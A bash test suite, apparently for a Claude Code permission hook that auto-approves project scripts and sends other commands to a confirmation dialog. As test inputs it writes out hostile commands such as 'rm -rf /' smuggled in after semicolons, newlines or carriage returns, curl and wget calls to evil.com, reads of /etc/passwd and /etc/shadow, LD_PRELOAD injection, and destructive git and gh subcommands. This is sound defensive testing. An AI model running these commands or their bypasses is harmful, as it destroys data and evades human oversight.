#!/bin/bash
# .claude/hooks/test-permission-fallback.sh
#
# PermissionRequest hook のテスト（拡張版）
# 使用法: bash .claude/hooks/test-permission-fallback.sh

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
HOOK="$SCRIPT_DIR/permission-fallback"
PASS=0; FAIL=0

test_case() {
  local cmd="$1" expected="$2" desc="$3"
  local escaped_cmd="${cmd//\"/\\\"}"
  local input="{\"tool_input\":{\"command\":\"$escaped_cmd\"},\"tool_name\":\"Bash\",\"hook_event_name\":\"PermissionRequest\"}"
  local output
  output=$(echo "$input" | "$HOOK" 2>/dev/null)

  if [ "$expected" = "allow" ]; then
    if echo "$output" | jq -e '.hookSpecificOutput.decision.behavior == "allow"' >/dev/null 2>&1; then
      ((PASS++))
    else
      echo "FAIL [$desc]: expected allow, got: $output"
      ((FAIL++))
    fi
  elif [ "$expected" = "dialog" ]; then
    if [ -z "$output" ]; then
      ((PASS++))
    else
      echo "FAIL [$desc]: expected dialog (empty), got: $output"
      ((FAIL++))
    fi
  fi
}

# test_case_raw: accepts pre-built JSON (for cases with control chars, custom tool_name, etc.)
test_case_raw() {
  local input="$1" expected="$2" desc="$3"
  local output
  output=$(printf '%s' "$input" | "$HOOK" 2>/dev/null)

  if [ "$expected" = "allow" ]; then
    if echo "$output" | jq -e '.hookSpecificOutput.decision.behavior == "allow"' >/dev/null 2>&1; then
      ((PASS++))
    else
      echo "FAIL [$desc]: expected allow, got: $output"
      ((FAIL++))
    fi
  elif [ "$expected" = "dialog" ]; then
    if [ -z "$output" ]; then
      ((PASS++))
    else
      echo "FAIL [$desc]: expected dialog (empty), got: $output"
      ((FAIL++))
    fi
  fi
}

echo "=== Basic Allow Cases ==="
test_case "python3 scripts/foo.py" allow "python3 + relative"
test_case "python3 ./scripts/foo.py" allow "python3 + dotslash"
test_case "python3 .claude/skills/refine-iteratively/scripts/extract_metadata.py --file result.md" allow "python3 + deep path"
test_case "python3 $PROJECT_ROOT/scripts/foo.py" allow "python3 + absolute"
test_case "bash scripts/run.sh" allow "bash + relative"
test_case "bash ./scripts/validate.sh arg1 arg2" allow "bash + args"

echo ""
echo "=== sh Interpreter Support ==="
test_case "sh scripts/validate.sh" allow "sh + relative"
test_case "sh ./scripts/foo.sh" allow "sh + dotslash"

echo ""
echo "=== Compound Commands (CRITICAL) ==="
test_case "python3 scripts/foo.py; rm -rf /" dialog "semicolon injection"
test_case "python3 foo.py | grep scripts/" dialog "pipe"
test_case "python3 foo.py && echo done" dialog "AND operator"
test_case "python3 foo.py || exit 1" dialog "OR operator"
test_case "\$(python3 scripts/foo.py)" dialog "command substitution"
test_case "\`python3 scripts/foo.py\`" dialog "backtick substitution"

echo ""
echo "=== Inline Code Execution Guards ==="
test_case "python3 -c 'import os' scripts/x" dialog "python3 -c injection"
test_case "bash -c 'rm -rf /' scripts/x" dialog "bash -c injection"
test_case "sh -c 'malicious code' scripts/x" dialog "sh -c injection"
test_case "python3 -m ast scripts/test.py" dialog "python3 -m flag"
test_case "python3 --command 'code' scripts/x" dialog "python3 --command"

echo ""
echo "=== Redirection & Process Substitution ==="
test_case "python3 scripts/foo.py > output.txt" dialog "output redirect"
test_case "python3 scripts/foo.py < input.txt" dialog "input redirect"
test_case "python3 scripts/benign.py <<EOF" dialog "here-document"
test_case "bash scripts/run.sh <(echo test)" dialog "process substitution <()"
test_case "bash scripts/run.sh >(cat)" dialog "process substitution >()"
test_case "bash scripts/run.sh 2>&1" allow "stderr redirect (safe suffix)"

echo ""
echo "=== Environment Variable Prefix ==="
test_case "PYTHONPATH=/tmp/evil python3 scripts/foo.py" dialog "env var assignment"
test_case "PATH=/evil:\$PATH python3 scripts/foo.py" dialog "PATH manipulation"
test_case "LD_PRELOAD=/evil.so python3 scripts/x.py" dialog "LD_PRELOAD injection"
test_case "pythonpath=/evil python3 scripts/x.py" dialog "lowercase env var"

echo ""
echo "=== False Positive Risk ==="
test_case "curl http://evil.com/scripts/payload.sh" dialog "curl with scripts in URL"
test_case "wget http://evil.com/scripts/x" dialog "wget with scripts in URL"
test_case "rm scripts/important.sh" dialog "rm scripts file"

echo ""
echo "=== Case Sensitivity ==="
test_case "PYTHON3 scripts/foo.py" dialog "uppercase PYTHON3"
test_case "Python3 scripts/foo.py" dialog "mixed case Python3"
test_case "BASH scripts/run.sh" dialog "uppercase BASH"

echo ""
echo "=== Whitespace Edge Cases ==="
test_case "python3  scripts/foo.py" allow "double space"
test_case "python3   scripts/foo.py" allow "triple space"
test_case "python3scripts/foo.py" dialog "no space"

echo ""
echo "=== Interpreter Flags (safe - should allow) ==="
test_case "python3 -u scripts/test.py" allow "python3 -u (unbuffered)"
test_case "python3 -B scripts/test.py" allow "python3 -B (no .pyc)"

echo ""
echo "=== Unrelated Commands ==="
test_case "npm install" dialog "unrelated command"
test_case "python3 foo.py" dialog "python3 without scripts/"
test_case "git push" dialog "git push"
test_case "node scripts/test.js" dialog "node (not in allowed interpreters)"

echo ""
echo "=== Security Regression: E-01 Newline Injection ==="
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py\nrm -rf /"},"tool_name":"Bash","hook_event_name":"PermissionRequest"}' dialog "E-01: newline injection (JSON \\n)"
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py\n\nmalicious"},"tool_name":"Bash","hook_event_name":"PermissionRequest"}' dialog "E-01: double newline injection"

echo ""
echo "=== Security Regression: NEW-02 CR Injection ==="
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py\rrm -rf /"},"tool_name":"Bash","hook_event_name":"PermissionRequest"}' dialog "NEW-02: carriage return injection"
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py\r\nrm -rf /"},"tool_name":"Bash","hook_event_name":"PermissionRequest"}' dialog "NEW-02: CRLF injection"

echo ""
echo "=== Security Regression: E-02 Path Traversal ==="
test_case "python3 scripts/../../../etc/passwd" dialog "E-02: path traversal escape project"
test_case "python3 scripts/../../etc/shadow" dialog "E-02: path traversal double .."
test_case "python3 scripts/sub/../foo.py" allow "E-02: path traversal stays in scripts/"
test_case "python3 ./scripts/../scripts/foo.py" allow "E-02: traversal resolves back to scripts/"

echo ""
echo "=== Security Regression: E-03 Greedy Match Bypass ==="
test_case "python3 /tmp/evil.py scripts/foo.py" dialog "E-03: evil script before scripts/ arg"
test_case "python3 /tmp/scripts/evil.py" dialog "NEW-03: arbitrary /tmp/scripts/ directory"
test_case "python3 /opt/other/scripts/evil.py" dialog "E-03: outside project scripts/"

echo ""
echo "=== Security Regression: E-04 Dangerous Bash Flags ==="
test_case "bash --init-file /tmp/evil scripts/foo.sh" dialog "E-04: bash --init-file"
test_case "bash --rcfile /tmp/evil scripts/foo.sh" dialog "E-04: bash --rcfile"
test_case "bash -i scripts/foo.sh" dialog "E-04: bash -i interactive"

echo ""
echo "=== Security Regression: E-05 No-Space Flag Bypass ==="
test_case 'python3 -c"import os" scripts/x' dialog "E-05: -c no space with code"
test_case 'python3 -cscripts/foo.py' dialog "E-05: -c masquerade as path"
test_case 'python3 -mhttp.server scripts/x' dialog "E-05: -m no space"
test_case 'python3 -e"import os" scripts/x' dialog "E-05: -e no space"
test_case "python3 --command code scripts/x" dialog "E-05: --command long form"
test_case "python3 --eval code scripts/x" dialog "E-05: --eval long form"

echo ""
echo "=== Security Regression: E-06 Variable Expansion ==="
test_case 'python3 scripts/$EVIL.py' dialog "E-06: dollar variable in path"
test_case 'python3 scripts/${EVIL}.py' dialog "E-06: brace variable in path"
test_case 'python3 scripts/$[1+1].py' dialog "E-06: arithmetic expansion"

echo ""
echo "=== Security Regression: E-07 Substring Match ==="
test_case "python3 evil_scripts/payload.py" dialog "E-07: evil_scripts/ directory"
test_case "python3 myscripts/foo.py" dialog "E-07: myscripts/ directory"
test_case "python3 notscripts/foo.py" dialog "E-07: notscripts/ directory"

echo ""
echo "=== Security Regression: E-08 tool_name Check ==="
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py"},"tool_name":"Write","hook_event_name":"PermissionRequest"}' dialog "E-08: tool_name=Write"
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py"},"tool_name":"","hook_event_name":"PermissionRequest"}' dialog "E-08: tool_name empty"
test_case_raw '{"tool_input":{"command":"python3 scripts/foo.py"},"hook_event_name":"PermissionRequest"}' dialog "E-08: tool_name missing"

echo ""
echo "=== Extended Safe Flags ==="
test_case "python3 -u -B scripts/test.py" allow "multi-flag: -u -B"
test_case "python3 -s scripts/test.py" allow "python3 -s flag"
test_case "python3 -v scripts/test.py" allow "python3 -v flag"

echo ""
echo "=== Security Review: Tilde Expansion ==="
test_case "python3 ~/scripts/foo.py" dialog "tilde home expansion"
test_case "python3 ~root/scripts/foo.py" dialog "tilde user expansion"
test_case "python3 ~+/scripts/foo.py" dialog "tilde PWD expansion"

echo ""
echo "=== Security Review: Glob Characters ==="
test_case "python3 scripts/*.py" dialog "glob wildcard"
test_case "python3 scripts/?.py" dialog "glob single-char wildcard"
test_case 'python3 scripts/{a,b}.py' dialog "brace expansion"

echo ""
echo "=== Direct Execution (shebang) ==="
test_case "./scripts/foo.sh" allow "direct: dotslash relative"
test_case "scripts/foo.sh" allow "direct: relative without dotslash"
test_case "$PROJECT_ROOT/scripts/foo.sh" allow "direct: absolute path"
test_case "$PROJECT_ROOT/scripts/sub/bar.py" allow "direct: absolute nested"
test_case ".claude/skills/refine-iteratively/scripts/extract_metadata.py" allow "direct: deep scripts/ path"
test_case "./scripts/foo.sh arg1 arg2" allow "direct: with arguments"
test_case "/tmp/evil.sh" dialog "direct: outside project"
test_case "./not-scripts/foo.sh" dialog "direct: not in scripts/"
test_case "../other/scripts/foo.sh" dialog "direct: traversal outside project"
test_case "./evil_scripts/foo.sh" dialog "direct: evil_scripts substring"
test_case "source scripts/foo.sh" dialog "direct: source builtin"
test_case ". scripts/foo.sh" dialog "direct: dot builtin"
test_case "exec scripts/foo.sh" dialog "direct: exec builtin"
test_case "eval scripts/foo.sh" dialog "direct: eval builtin"

echo ""
echo "=== Path Normalization ==="
test_case "python3 ./scripts/foo.py" allow "dotslash normalization"
test_case "python3 scripts/./foo.py" allow "mid-path dot normalization"
test_case "python3 scripts/subdir/../foo.py" allow "mid-path traversal resolves in scripts/"

echo ""
echo "=== .claude/hooks/ Directory Support ==="
test_case "bash .claude/hooks/test-permission-fallback.sh" allow ".claude/hooks/ direct bash"
test_case "bash .claude/hooks/permission-fallback.sh" allow ".claude/hooks/ hook itself"
test_case ".claude/hooks/test-permission-fallback.sh" allow ".claude/hooks/ direct execution"
test_case "sh .claude/hooks/some-hook.sh" allow ".claude/hooks/ via sh"
test_case "bash .claude/evil-hooks/payload.sh" dialog ".claude/evil-hooks/ substring"
test_case "bash ../.claude/hooks/escape.sh" dialog "traversal .claude/hooks/"
test_case "bash .claude/hooks_evil/script.sh" dialog ".claude/hooks_evil/ suffix"

echo ""
echo "=== init_refine_dir.sh Support ==="
test_case "bash .claude/skills/refine-iteratively/scripts/init_refine_dir.sh" allow "refine init script"
test_case "bash .claude/skills/refine-iteratively/scripts/init_refine_dir.sh ./custom_output/" allow "refine init with args"
test_case "python3 .claude/skills/refine-iteratively/scripts/extract_metadata.py" allow "refine extract_metadata script"
test_case ".claude/skills/refine-iteratively/scripts/init_refine_dir.sh" allow "refine init direct execution"

echo ""
echo "=== Deleted settings.json Rules Coverage ==="
test_case "./scripts/new_cmd.sh" allow "direct: scripts/new_cmd.sh"
test_case "bash scripts/validate_result.sh result.md coder" allow "validate_result.sh with args"
test_case "python3 scripts/foo.py" allow "python3 scripts/foo.py (reconfirm)"
test_case "bash .claude/hooks/test-permission-fallback.sh" allow "test-permission-fallback.sh (reconfirm)"

echo ""
echo "=== Phase 7B2: Subcommand Rejection (NEW) ==="

# git subcommands
test_case "git push" dialog "7B2: git push (no args)"
test_case "git push origin main" dialog "7B2: git push with args"
test_case "git push -f origin main" dialog "7B2: git push force"
test_case "git clean" dialog "7B2: git clean (no flags)"
test_case "git clean -f" dialog "7B2: git clean -f"
test_case "git clean -fd" dialog "7B2: git clean -fd"
test_case "git reset" allow "7B2: git reset (no --hard flag)"
test_case "git reset HEAD~1" allow "7B2: git reset soft"
test_case "git reset --hard" dialog "7B2: git reset --hard (no args)"
test_case "git reset --hard HEAD~1" dialog "7B2: git reset --hard with ref"
test_case "git reset --hard origin/main" dialog "7B2: git reset --hard remote"
test_case "git checkout ." dialog "7B2: git checkout . (discard changes)"
test_case "git checkout main" allow "7B2: git checkout branch (safe)"
test_case "git checkout -b feature" allow "7B2: git checkout new branch"
test_case "git restore ." dialog "7B2: git restore . (discard changes)"
test_case "git restore file.txt" allow "7B2: git restore single file"

# gh subcommands
test_case "gh pr merge 123" dialog "7B2: gh pr merge"
test_case "gh pr merge --squash 123" dialog "7B2: gh pr merge squash"
test_case "gh pr view 123" allow "7B2: gh pr view (safe)"
test_case "gh pr list" allow "7B2: gh pr list (safe)"
test_case "gh pr create" allow "7B2: gh pr create (safe)"
test_case "gh repo delete myrepo" dialog "7B2: gh repo delete"
test_case "gh repo archive myrepo" dialog "7B2: gh repo archive"
test_case "gh repo view" allow "7B2: gh repo view (safe)"
test_case "gh release delete v1.0.0" dialog "7B2: gh release delete"
test_case "gh release list" allow "7B2: gh release list (safe)"

# Edge cases: subcommand-like strings that should NOT match
test_case "git status" allow "7B2: git status (not in deny list)"
test_case "git log" allow "7B2: git log (safe)"
test_case "git diff" allow "7B2: git diff (safe)"
test_case "gh api repos/foo/bar" allow "7B2: gh api (safe)"
test_case "gh issue list" allow "7B2: gh issue (safe)"

# Flag order variations
test_case "git reset HEAD~1 --hard" dialog "7B2: git reset --hard at end"
test_case "git --no-pager reset --hard" dialog "7B2: git reset --hard with global flag"

# Substring attack prevention
test_case "mygit push data" allow "7B2: mygit (not git) should pass Phase 7"
test_case "/usr/bin/git push" dialog "7B2: absolute path git push"
test_case "./git push" dialog "7B2: ./git outside scripts/ (direct exec must be in scripts/ or .claude/hooks/)"

echo ""
echo "=== Security Regression: Missing Coverage (R2) ==="

# TEST-01: Very long path (near PATH_MAX)
# Note: realpath -m succeeds on paths up to PATH_MAX (4096), so this should allow.
# The security review's "could cause realpath to fail" scenario doesn't occur at 4000 chars.
LONG_PATH="scripts/$(python3 -c "print('a' * 4000)").py"
test_case "python3 $LONG_PATH" allow "TEST-01: very long path (near PATH_MAX)"

# TEST-02: Empty command value
test_case_raw '{"tool_input":{"command":""},"tool_name":"Bash","hook_event_name":"PermissionRequest"}' dialog "TEST-02: empty command value"

# TEST-03: Null byte in JSON (encoded as \u0000)
test_case_raw '{"tool_input":{"command":"python3 scripts/foo\u0000.py"},"tool_name":"Bash","hook_event_name":"PermissionRequest"}' dialog "TEST-03: null byte in command (JSON \\u0000)"

echo ""
echo "=== Safe Trailing Suffixes (Phase 1.5) ==="

# Stderr redirections
test_case "bash scripts/health_check.sh 2>&1" allow "suffix: 2>&1"
test_case "python3 scripts/foo.py 2>/dev/null" allow "suffix: 2>/dev/null"
test_case "bash scripts/run.sh 2>&1" allow "suffix: 2>&1 (bash)"

# Error suppression
test_case "bash scripts/foo.sh || true" allow "suffix: || true"
test_case "python3 scripts/bar.py || true" allow "suffix: || true (python3)"

# Echo with literal strings (double-quoted)
test_case 'bash scripts/foo.sh || echo "failed"' allow 'suffix: || echo "literal"'
test_case 'bash scripts/foo.sh && echo "success"' allow 'suffix: && echo "literal"'
test_case 'python3 scripts/bar.py && echo "done"' allow 'suffix: && echo "literal" (python3)'

# Echo with literal strings (single-quoted)
test_case "bash scripts/foo.sh || echo 'failed'" allow "suffix: || echo 'literal'"
test_case "bash scripts/foo.sh && echo 'success'" allow "suffix: && echo 'literal'"

# Combinations
test_case "bash scripts/foo.sh 2>&1 || true" allow "suffix: 2>&1 || true"
test_case 'bash scripts/foo.sh 2>&1 || echo "failed"' allow 'suffix: 2>&1 || echo "literal"'
test_case "bash scripts/foo.sh 2>/dev/null || true" allow "suffix: 2>/dev/null || true"
test_case 'python3 scripts/bar.py 2>&1 && echo "done"' allow 'suffix: 2>&1 && echo "literal"'

# With script arguments
test_case "bash scripts/validate.sh arg1 arg2 2>&1" allow "suffix: args + 2>&1"
test_case "bash scripts/validate.sh arg1 || true" allow "suffix: args + || true"
test_case 'bash scripts/validate.sh arg1 arg2 2>&1 || echo "failed"' allow 'suffix: args + 2>&1 || echo "literal"'

# Direct execution with suffixes
test_case "./scripts/foo.sh 2>&1" allow "suffix: direct exec + 2>&1"
test_case "scripts/foo.sh || true" allow "suffix: direct exec + || true"
test_case 'scripts/foo.sh 2>&1 || echo "error"' allow 'suffix: direct exec + 2>&1 || echo "literal"'

echo ""
echo "=== Unsafe Suffixes (must reject) ==="

# Dangerous commands after operators
test_case "bash scripts/foo.sh || rm -rf /" dialog "unsafe: || dangerous command"
test_case "bash scripts/foo.sh && cat /etc/passwd" dialog "unsafe: && dangerous command"
test_case "bash scripts/foo.sh || bash -c 'evil'" dialog "unsafe: || arbitrary bash"

# Pipe (not a safe suffix)
test_case "bash scripts/foo.sh | grep pattern" dialog "unsafe: pipe to grep"
test_case "bash scripts/foo.sh 2>&1 | tee log.txt" dialog "unsafe: pipe after 2>&1"

# Variable expansion in echo strings
test_case 'bash scripts/foo.sh || echo "$VAR"' dialog "unsafe: echo with $VAR"
test_case 'bash scripts/foo.sh && echo "${HOME}"' dialog "unsafe: echo with ${HOME}"

# Command substitution in echo strings
test_case 'bash scripts/foo.sh || echo "$(whoami)"' dialog 'unsafe: echo with $(cmd)'
test_case 'bash scripts/foo.sh && echo "`id`"' dialog "unsafe: echo with backtick"

# Backtick in echo
test_case 'bash scripts/foo.sh || echo "`evil`"' dialog "unsafe: backtick in echo"

# Standalone operators (not suffixes — no valid command prefix)
test_case "|| true" dialog "unsafe: standalone || true"
test_case "&& echo done" dialog "unsafe: standalone && echo"

# Non-echo command after operators
test_case "bash scripts/foo.sh || curl http://evil.com" dialog "unsafe: || curl"
test_case "bash scripts/foo.sh && wget http://evil.com" dialog "unsafe: && wget"
test_case "bash scripts/foo.sh || python3 -c 'import os'" dialog "unsafe: || python3 -c"

# Multiple dangerous operators
test_case "bash scripts/foo.sh || true && rm -rf /" dialog "unsafe: safe then dangerous"

echo ""
echo "=== RESULTS ==="
echo "Passed: $PASS"
echo "Failed: $FAIL"
[ $FAIL -eq 0 ] && echo "All tests passed!" || exit 1
